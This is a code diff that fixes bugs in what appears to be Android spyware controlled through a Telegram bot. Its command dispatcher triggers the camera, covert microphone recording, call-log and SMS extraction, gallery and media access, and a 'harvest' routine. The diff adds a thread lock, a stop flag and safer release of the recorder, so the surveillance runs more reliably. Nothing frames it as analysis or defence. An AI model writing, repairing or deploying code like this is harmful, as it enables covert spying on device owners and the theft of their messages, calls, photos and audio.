@@ -54,8 +54,10 @@ class C:
     def __init__(self):
         self.mic_busy = False
         self._mic_lock = threading.Lock()
+        self._exec_lock = threading.Lock()          # ✅ تصحيح الخطأ 2: قفل أمان الخيوط
         self._component_lock = threading.Lock()
         self._components_loaded = False
+        self._stop_recording = False                # ✅ تصحيح الخطأ 3: تعريف المتغير المفقود
         self._config = self._load_config()
         self._last_activity = {}
         self._activity_lock = threading.Lock()
@@ -246,6 +248,7 @@ class C:
         out_path = os.path.join(TEMP_DIR, self._unique_filename("audio", ".aac"))
         min_size = self._config.get("min_audio_size", 5000)  # 5KB
 
+        # ✅ تصحيح الخطأ 1: استخدام try/finally لضمان تحرير الميكروفون
         try:
             # التحقق من الصلاحية
             if not self._check_permissions(['android.permission.RECORD_AUDIO']):
@@ -264,12 +267,14 @@ class C:
 
             # تسجيل مع إمكانية المقاطعة (تسجيل لمدة duration ثانية)
             for _ in range(duration):
-                if self._stop_recording:  # يمكن إضافة متغير للإيقاف المبكر
+                if self._stop_recording:
                     break
                 time.sleep(1)
 
-            media_recorder.stop()
-            media_recorder.reset()
+            try:
+                media_recorder.stop()
+            except Exception as e:
+                logging.error(f"MediaRecorder stop error: {e}")
 
             # التحقق من الملف
             if os.path.exists(out_path):
@@ -289,12 +294,19 @@ class C:
             logging.error(f"Recording error: {e}")
             self._safe_remove(out_path)
             return None
+
         finally:
+            # تحرير MediaRecorder
             if media_recorder:
+                try:
+                    media_recorder.stop()
+                except:
+                    pass
                 try:
                     media_recorder.release()
                 except:
                     pass
+            # إعادة تعيين حالة الميكروفون
             with self._mic_lock:
                 self.mic_busy = False
 
@@ -401,44 +413,46 @@ class C:
 
     # ========== المعالج الرئيسي ==========
     def _execute(self, cmd, tg, m, cid, cbq):
-        try:
-            if not cmd or not isinstance(cmd, str):
-                return
-            if cbq:
+        # ✅ تصحيح الخطأ 2: استخدام قفل التزامن لحماية تنفيذ الأوامر
+        with self._exec_lock:
+            try:
+                if not cmd or not isinstance(cmd, str):
+                    return
+                if cbq:
+                    try:
+                        tg._api("answerCallbackQuery", {"callback_query_id": cbq})
+                    except:
+                        pass
+                self._ensure_components(m)
+                if cmd.startswith(("g_nav|", "g_opt|", "g_conf|", "g_act|", "g_bulk|")):
+                    self._handle_gallery(cmd, tg, m, cid)
+                elif cmd.startswith(("cam_", "camf_")):
+                    self._handle_camera(cmd, tg, m, cid)
+                elif cmd.startswith("mic_"):
+                    self._handle_mic(tg, m, cid)
+                elif cmd.startswith("callog_"):
+                    self._handle_callog(tg, cid)
+                elif cmd.startswith("sms_"):
+                    self._handle_sms(tg, cid)
+                elif cmd.startswith("hrv_"):
+                    self._handle_harvest(tg, m, cid)
+                elif cmd.startswith("send_now_"):
+                    self._handle_send_now(tg, m, cid)
+                elif cmd.startswith("media_"):
+                    self._handle_media(tg, m, cid)
+                else:
+                    tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ أمر غير معروف. استخدم /menu لعرض القائمة."})
+            except Exception as e:
+                logging.error(f"Command handler error: {e}")
                 try:
-                    tg._api("answerCallbackQuery", {"callback_query_id": cbq})
+                    tg._api("sendMessage", {"chat_id": cid, "text": f"❌ خطأ داخلي: {str(e)[:100]}"})
                 except:
                     pass
-            self._ensure_components(m)
-            if cmd.startswith(("g_nav|", "g_opt|", "g_conf|", "g_act|", "g_bulk|")):
-                self._handle_gallery(cmd, tg, m, cid)
-            elif cmd.startswith(("cam_", "camf_")):
-                self._handle_camera(cmd, tg, m, cid)
-            elif cmd.startswith("mic_"):
-                self._handle_mic(tg, m, cid)
-            elif cmd.startswith("callog_"):
-                self._handle_callog(tg, cid)
-            elif cmd.startswith("sms_"):
-                self._handle_sms(tg, cid)
-            elif cmd.startswith("hrv_"):
-                self._handle_harvest(tg, m, cid)
-            elif cmd.startswith("send_now_"):
-                self._handle_send_now(tg, m, cid)
-            elif cmd.startswith("media_"):
-                self._handle_media(tg, m, cid)
-            else:
-                tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ أمر غير معروف. استخدم /menu لعرض القائمة."})
-        except Exception as e:
-            logging.error(f"Command handler error: {e}")
-            try:
-                tg._api("sendMessage", {"chat_id": cid, "text": f"❌ خطأ داخلي: {str(e)[:100]}"})
-            except:
-                pass
-        finally:
-            try:
-                gc.collect()
-            except:
-                pass
+            finally:
+                try:
+                    gc.collect()
+                except:
+                    pass
 
     # ========== معالج المعرض ==========
     def _handle_gallery(self, cmd, tg, m, cid):
